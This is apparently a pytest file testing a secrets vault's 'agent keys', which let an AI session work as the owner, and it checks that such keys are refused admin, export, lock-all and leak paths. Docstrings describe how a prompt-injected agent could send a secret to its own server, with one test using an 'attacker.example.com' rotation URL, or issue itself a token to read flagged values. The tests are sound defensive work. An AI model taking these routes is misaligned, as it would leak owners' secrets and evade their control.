"""Agent keys (0.41.8): an AI session or an automation works with the vault as the owner — folders, secrets, tokens,
users — without the master password in an environment variable and without a person. Positive: what it is for.
Negative: what it must never reach, a wrong / revoked / expired key, a foreign network, an agent minting an agent."""
import json

import pytest
from fastapi.testclient import TestClient

import db
import main
import netutil
from conftest import unlock


def _agent_client(key):
    c = TestClient(main.app, base_url="https://vault.test")
    netutil.clear_fails("testclient")
    r = c.post("/api/auth/agent", json={"key": key})
    return c, r


@pytest.fixture(scope="module")
def owner(client, initialized):
    return unlock(client)


@pytest.fixture(scope="module")
def agent(client, owner):
    r = client.post("/api/agent-keys", json={"name": "ai-sessions-test"}, headers=owner)
    assert r.status_code == 200, r.text
    key = r.json()["key"]
    c, login = _agent_client(key)
    assert login.status_code == 200, login.text
    return {"key": key, "id": r.json()["id"], "c": c, "h": {"X-CSRF-Token": login.json()["csrf_token"]}}


def test_the_key_is_shown_once_and_the_database_cannot_open_anything(client, owner, agent):
    assert agent["key"].startswith("vlt_agent_")
    listed = client.get("/api/agent-keys", headers=owner).json()
    me = next(k for k in listed if k["name"] == "ai-sessions-test")
    assert "key" not in me and agent["key"] not in json.dumps(listed)
    with db.get_session() as s:
        row = s.get(db.AgentKey, agent["id"])
        assert agent["key"] not in (row.key_hash or "") and len(row.master_key_enc) > 32


def test_the_agent_does_the_owners_routine_work(client, owner, agent):
    c, h = agent["c"], agent["h"]
    f = c.post("/api/folders", json={"name": "delivery-keys-test", "description": "by an agent"}, headers=h)
    assert f.status_code == 200, f.text
    fid = f.json()["id"]
    sec = c.post("/api/secrets", json={"folder_id": fid, "name": "dk-1", "value": "v-agent-1"}, headers=h)
    assert sec.status_code == 200, sec.text
    assert c.get(f"/api/secrets/{sec.json()['id']}", headers=h).json()["value"] == "v-agent-1"
    tok = c.post("/api/tokens", json={"name": "bc-write-test", "folder_id": fid, "can_write": True}, headers=h)
    assert tok.status_code == 200, tok.text
    raw = tok.json()["raw_token"]
    m = client.get("/api/v1/m/secret/dk-1", headers={"Authorization": f"Bearer {raw}"})
    assert m.status_code == 200 and m.json()["value"] == "v-agent-1"            # the token it issued works
    u = c.post("/api/users", json={"email": "valodrive-session@example.com", "name": "valodrive session"}, headers=h)
    assert u.status_code == 200, u.text
    g = c.put(f"/api/users/{u.json()['id']}/grants", json={"folder_id": fid, "role": "manager"}, headers=h)
    assert g.status_code == 200, g.text
    # the audit names the agent, not "master"
    audit = client.get("/api/audit?limit=200", headers=owner).json()
    mine = {a["action"] for a in audit if a["actor"] == "agent:ai-sessions-test"}
    assert {"auth:agent", "folder:create", "token:create"} <= mine, mine


@pytest.mark.parametrize("method,path,body", [
    ("POST", "/api/auth/change-password", {"old_password": "x" * 12, "new_password": "y" * 12}),
    ("GET", "/api/export", None),
    ("POST", "/api/backup/keygen", {"master_password": "x" * 12}),
    ("PUT", "/api/backup/config", {"enabled": False}),
    ("POST", "/api/webhooks", {"name": "x", "url": "https://hooks.example.com/x"}),
    ("POST", "/api/agent-keys", {"name": "minted-by-an-agent"}),
    ("GET", "/api/agent-keys", None),
    ("DELETE", "/api/agent-keys/1", None),
    ("POST", "/api/update/apply", {"version": "9.9.9"}),
    ("POST", "/api/auth/2fa/setup", None),
    ("POST", "/api/auth/sso-unlock/enable", {"master_password": "x" * 12}),
    ("POST", "/api/folders/1/rotate-key", None),
    ("POST", "/api/import", {"secrets": []}),
])
def test_what_an_agent_never_reaches(agent, method, path, body):
    r = agent["c"].request(method, path, json=body, headers=agent["h"])
    assert r.status_code == 403 and ("agent key" in r.text), (path, r.status_code, r.text)


def test_wrong_and_malformed_keys_are_refused(agent):
    for key in (agent["key"][:-4] + "AAAA", "vlt_agent_" + "x" * 43, "vlt_" + agent["key"][4:].replace("agent_", "") , "not-a-key-at-all-xxxxxxxxx"):
        _, r = _agent_client(key)
        assert r.status_code == 401, (key[:12], r.status_code)


def test_revoking_ends_the_key_and_its_open_sessions(client, owner):
    k = client.post("/api/agent-keys", json={"name": "to-revoke-test"}, headers=owner).json()
    c, login = _agent_client(k["key"])
    h = {"X-CSRF-Token": login.json()["csrf_token"]}
    assert c.get("/api/folders", headers=h).status_code == 200
    r = client.delete(f"/api/agent-keys/{k['id']}", headers=owner)
    assert r.status_code == 200 and r.json()["sessions_ended"] == 1
    assert c.get("/api/folders", headers=h).status_code == 401                 # the open session is gone
    assert _agent_client(k["key"])[1].status_code == 401                         # and the key opens nothing


def test_an_expired_key_stops_working_even_inside_a_session(client, owner):
    k = client.post("/api/agent-keys", json={"name": "expiring-test", "expires_days": 1}, headers=owner).json()
    c, login = _agent_client(k["key"])
    h = {"X-CSRF-Token": login.json()["csrf_token"]}
    assert c.get("/api/folders", headers=h).status_code == 200
    with db.get_session() as s:
        s.get(db.AgentKey, k["id"]).expires_at = db.utcnow().replace(year=2020); s.commit()
    assert c.get("/api/folders", headers=h).status_code == 401
    assert _agent_client(k["key"])[1].status_code == 401


def test_allowed_networks(client, owner):
    k = client.post("/api/agent-keys", json={"name": "netbound-test", "allowed_cidrs": "10.99.0.0/16"}, headers=owner).json()
    _, r = _agent_client(k["key"])
    assert r.status_code == 403 and "address" in r.text
    assert client.post("/api/agent-keys", json={"name": "bad-cidr", "allowed_cidrs": "not-a-network"}, headers=owner).status_code == 422


def test_names_are_unique_and_plain(client, owner):
    assert client.post("/api/agent-keys", json={"name": "ai-sessions-test"}, headers=owner).status_code == 409
    assert client.post("/api/agent-keys", json={"name": "with space"}, headers=owner).status_code == 422


def test_an_agent_cannot_lock_everybody_out(client, owner):
    """0.41.9: `POST /api/auth/lock?all=1` ends every session — the owner's too. An agent key acts as the owner, and the
    check was `kind == owner`, so an agent could lock the owner out. Its own session it may end; everyone's — no."""
    k = client.post("/api/agent-keys", json={"name": "lock-all-test"}, headers=owner).json()
    c, login = _agent_client(k["key"])
    h = {"X-CSRF-Token": login.json()["csrf_token"]}
    r = c.post("/api/auth/lock?all=1", headers=h)
    assert r.status_code == 403, r.text
    assert client.get("/api/folders", headers=owner).status_code == 200          # the owner is still in
    assert c.post("/api/auth/lock", headers=h).status_code == 200                # its own session it may end
    assert c.get("/api/folders", headers=h).status_code == 401


def test_an_agent_cannot_open_a_way_out_through_rotation(client, owner, monkeypatch):
    """0.41.9: rotation of a 'machines only' secret to an http receiver sends the NEW value to that receiver; through
    an administrator credential it changes any account of a target. Both were checked as kind == owner — an agent key
    passed. A prompt-injected agent could have pointed a machine-only secret at its own server."""
    import webhooks
    import api_rotation
    for m in (webhooks, api_rotation):
        monkeypatch.setattr(m, "_webhook_target_allowed", lambda url: True)       # no DNS in the test
    fid = client.post("/api/folders", json={"name": "agent-rot-test"}, headers=owner).json()["id"]
    sid = client.post("/api/secrets", json={"folder_id": fid, "name": "mo-1", "value": "x" * 20, "machine_only": True}, headers=owner).json()["id"]
    k = client.post("/api/agent-keys", json={"name": "rot-test"}, headers=owner).json()
    c, login = _agent_client(k["key"])
    h = {"X-CSRF-Token": login.json()["csrf_token"]}
    r = c.put(f"/api/secrets/{sid}/rotation", json={"target": "http", "config": {"url": "https://attacker.example.com/in"}, "interval_days": 0}, headers=h)
    assert r.status_code == 403 and "owner" in r.text, r.text
    r = c.put(f"/api/secrets/{sid}/rotation", json={"target": "postgres", "config": {"dsn_secret_id": sid, "role": "postgres"}, "interval_days": 0}, headers=h)
    assert r.status_code in (403, 422), r.text                                      # never configured by an agent
    assert r.status_code != 200
    # the owner in person still can (the http case) — the rule did not just close the door for everybody
    r = client.put(f"/api/secrets/{sid}/rotation", json={"target": "http", "config": {"url": "https://receiver.example.com/in"}, "interval_days": 0}, headers=owner)
    assert r.status_code == 200, r.text


def test_an_agent_cannot_reach_flagged_secrets_through_a_token_it_issues(client, owner):
    """0.41.9: a service token reads every value of its folder, 'machines only' and 'requires approval' included — so
    for a folder holding such secrets only the owner hands machine access out (0.37). The check was kind == owner; an
    agent key passed, issued itself a token and read the value the flag keeps away from it."""
    fid = client.post("/api/folders", json={"name": "agent-flagged-test"}, headers=owner).json()["id"]
    client.post("/api/secrets", json={"folder_id": fid, "name": "fl-1", "value": "flagged-value-123", "machine_only": True}, headers=owner)
    k = client.post("/api/agent-keys", json={"name": "flag-test"}, headers=owner).json()
    c, login = _agent_client(k["key"])
    h = {"X-CSRF-Token": login.json()["csrf_token"]}
    r = c.post("/api/tokens", json={"name": "agent-to-flagged", "folder_id": fid}, headers=h)
    assert r.status_code == 403 and "flagged-value-123" not in r.text, r.text
    r = c.post("/api/enrollments", json={"folder_id": fid}, headers=h)
    assert r.status_code == 403, r.text
    # a folder without flagged secrets: the agent issues tokens as before
    fid2 = client.post("/api/folders", json={"name": "agent-plain-test"}, headers=owner).json()["id"]
    assert c.post("/api/tokens", json={"name": "agent-to-plain", "folder_id": fid2}, headers=h).status_code == 200
    # and the owner in person still issues one for the flagged folder
    assert client.post("/api/tokens", json={"name": "owner-to-flagged", "folder_id": fid}, headers=owner).status_code == 200


def test_moving_a_flagged_secret_into_a_tokened_folder_does_not_leak_it(client, owner):
    """A token reads its folder. Moving a 'machines only' secret into a folder that already has a token would hand the
    value to that token — the same way out as issuing one. An agent (and a writer) must not be able to do that."""
    src = client.post("/api/folders", json={"name": "move-src-test"}, headers=owner).json()["id"]
    dst = client.post("/api/folders", json={"name": "move-dst-test"}, headers=owner).json()["id"]
    sid = client.post("/api/secrets", json={"folder_id": src, "name": "mv-flagged", "value": "moved-value-456", "machine_only": True}, headers=owner).json()["id"]
    k = client.post("/api/agent-keys", json={"name": "move-test"}, headers=owner).json()
    c, login = _agent_client(k["key"])
    h = {"X-CSRF-Token": login.json()["csrf_token"]}
    raw = c.post("/api/tokens", json={"name": "agent-dst-token", "folder_id": dst}, headers=h).json()["raw_token"]
    mv = c.patch(f"/api/secrets/{sid}", json={"folder_id": dst}, headers=h)
    assert mv.status_code == 403, mv.text
    m = client.get("/api/v1/m/secret/mv-flagged", headers={"Authorization": f"Bearer {raw}"})
    assert "moved-value-456" not in m.text, f"moved flagged secret leaked through the folder's token: {m.status_code}"


def test_a_writer_of_both_folders_cannot_move_a_flagged_secret_either(client, owner):
    """The same way out existed before agent keys: a named user who may write in both folders."""
    import api_users  # noqa: F401
    src = client.post("/api/folders", json={"name": "wmove-src-test"}, headers=owner).json()["id"]
    dst = client.post("/api/folders", json={"name": "wmove-dst-test"}, headers=owner).json()["id"]
    sid = client.post("/api/secrets", json={"folder_id": src, "name": "wmv-flagged", "value": "w-moved-789", "require_approval": True}, headers=owner).json()["id"]
    u = client.post("/api/users", json={"email": "writer-move@example.com", "name": "w"}, headers=owner).json()
    for f in (src, dst):
        assert client.put(f"/api/users/{u['id']}/grants", json={"folder_id": f, "role": "writer"}, headers=owner).status_code == 200
    w = TestClient(main.app, base_url="https://vault.test")
    assert w.post(f"/api/invite/{u['invite_url'].rsplit('/', 1)[-1]}", json={"password": "writer move password 1"}).status_code == 200
    netutil.clear_fails("testclient")
    lg = w.post("/api/auth/login", json={"email": "writer-move@example.com", "password": "writer move password 1"})
    assert lg.status_code == 200, lg.text
    r = w.patch(f"/api/secrets/{sid}", json={"folder_id": dst}, headers={"X-CSRF-Token": lg.json()["csrf_token"]})
    assert r.status_code == 403, r.text
    # the owner in person may
    assert client.patch(f"/api/secrets/{sid}", json={"folder_id": dst}, headers=owner).status_code == 200
